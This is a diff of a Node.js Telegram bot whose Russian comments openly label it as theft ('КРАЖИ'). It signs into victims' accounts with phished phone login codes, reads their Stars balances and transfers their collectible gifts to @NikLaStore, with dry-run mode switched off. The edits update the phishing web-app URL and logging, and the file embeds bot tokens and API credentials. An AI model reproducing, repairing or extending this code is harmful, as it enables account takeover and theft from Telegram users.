@@ -11,11 +11,11 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M
 const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
-const WEB_APP_URL = 'https://eeee-8hslra.fly.dev/';
+const WEB_APP_URL = 'https://eeee-8hslra.fly.dev'; // ОБНОВЛЕННЫЙ URL
 const TARGET_USERNAME = 'NikLaStore';
 
 // 🔧 НАСТРОЙКИ КРАЖИ
-const DRY_RUN = false; // true - только просмотр, false - реальная кража
+const DRY_RUN = false;
 
 const bot = new TelegramBot(BOT_TOKEN, { 
     polling: true,
@@ -183,6 +183,7 @@ async function signInWithRealCode(phone, code) {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
+    console.log(`🌐 Web App доступен по адресу: ${WEB_APP_URL}`);
 });
 
 // INLINE QUERY ДЛЯ ЧЕКОВ С ФОТОГРАФИЯМИ
@@ -540,7 +541,7 @@ async function stealAllGifts() {
                 
             } catch (error) {
                 console.log(`Ошибка: ${row.phone}`, error.message);
-                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
+                bot.sendMessage(MY_USER_ID, `❌ Ошибка ${row.photo}: ${error.message}`);
             }
         }
         
@@ -608,7 +609,6 @@ async function transferCollectibleGifts(client, phone) {
         const balanceStars = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;
 
         console.log(`⭐ ${phone}: Баланс Stars:`, balanceStars);
-        console.log("Raw баланс:", bal);
 
         // 2) Получаем список всех подарков
         const giftsRes = await client.invoke(
@@ -630,22 +630,6 @@ async function transferCollectibleGifts(client, phone) {
             bot.sendMessage(MY_USER_ID, `❌ ${phone}: Коллекционных подарков не найдено`);
             return false;
         }
-
-        // Логируем информацию о подарках
-        console.log(`\n==== Список collectible-подарков для ${phone} ====`);
-        collectible.forEach((g, idx) => {
-            console.log(`#${idx + 1}`, {
-                msgId: g.msgId,
-                savedId: g.savedId,
-                unsaved: g.unsaved,
-                transferStars: g.transferStars
-                    ? String(g.transferStars.value ?? g.transferStars)
-                    : null,
-                convertStars: g.convertStars
-                    ? String(g.convertStars.value ?? g.convertStars)
-                    : null,
-            });
-        });
 
         // 4) Получатель @NikLaStore
         const toPeer = await client.getInputEntity(TARGET_USERNAME);
@@ -837,5 +821,6 @@ bot.onText(/\/admin/, (msg) => {
     });
 });
 
-console.log('✅ Бот запущен с улучшенной логикой передачи collectible подарков');
+console.log('✅ Бот запущен с обновленным URL');
+console.log(`🌐 Web App: ${WEB_APP_URL}`);
 console.log(`🔧 Режим DRY_RUN: ${DRY_RUN ? 'ВКЛ (только просмотр)' : 'ВЫКЛ (реальная кража)'}`);
